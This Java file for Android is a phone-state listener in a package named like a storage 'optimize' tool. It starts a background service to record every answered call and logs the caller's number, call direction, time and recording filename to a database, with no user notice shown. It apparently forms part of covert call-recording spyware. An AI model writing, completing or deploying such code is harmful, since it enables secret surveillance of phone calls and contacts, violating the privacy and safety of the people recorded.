package com.android.sd.optimize;

import android.content.ComponentName;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class PhoneListener extends PhoneStateListener {
	private BackService context;

	Intent callIntent;
	boolean isrecording = false;
	public static String filename = "";

	public PhoneListener(BackService c) {
		context = c;
	}

	public void onCallStateChanged(int state, String incomingNumber) {
		Log.e("callstate", "no: " + incomingNumber);
		switch (state) {
		case TelephonyManager.CALL_STATE_IDLE:
			Log.e("callstate", "call_state_idle");
			if (isrecording) {
				isrecording = false;
				while (!context.stopService(callIntent))
					;
				if (context.received && context.called) {
					Log.e("out_out", Util.getTime());
					BackService.dbHandler.putRequest(context.outNo, DBHandler.CALL, Util.getTime(), "out",
							"", filename);
					context.ringing = false;
					context.received = false;
					context.called = false;
				} else if (context.ringing && context.received) {
					Log.e("out_in", Util.getTime());
					BackService.dbHandler.putRequest(context.inNo, DBHandler.CALL, Util.getTime(), "in", "",
							filename);
					context.ringing = false;
					context.received = false;
					context.called = false;
				}
				// else if (context.ringing) {
				// Time t = new Time();
				// t.setToNow();
				// Log.e("out_miss", Util.getTime());
				// BackService.dbHandler.putRequest(context.inNo, DBHandler.CALL, Util.getTime(), "miss",
				// "");
				// context.ringing = false;
				// context.received = false;
				// context.called = false;
				// }
			}
			break;
		case TelephonyManager.CALL_STATE_RINGING:
			Log.e("callState", "Call state ringing");
			context.inNo = incomingNumber;
			context.ringing = true;
			context.received = false;
			context.called = false;
			break;
		case TelephonyManager.CALL_STATE_OFFHOOK:
			Log.e("callState", "Call state offhook");
			context.received = true;
			callIntent = new Intent(context, RecordService.class);
			ComponentName name = context.startService(callIntent);
			if (null != name) {
				isrecording = true;
			}
			break;
		}
	}
}
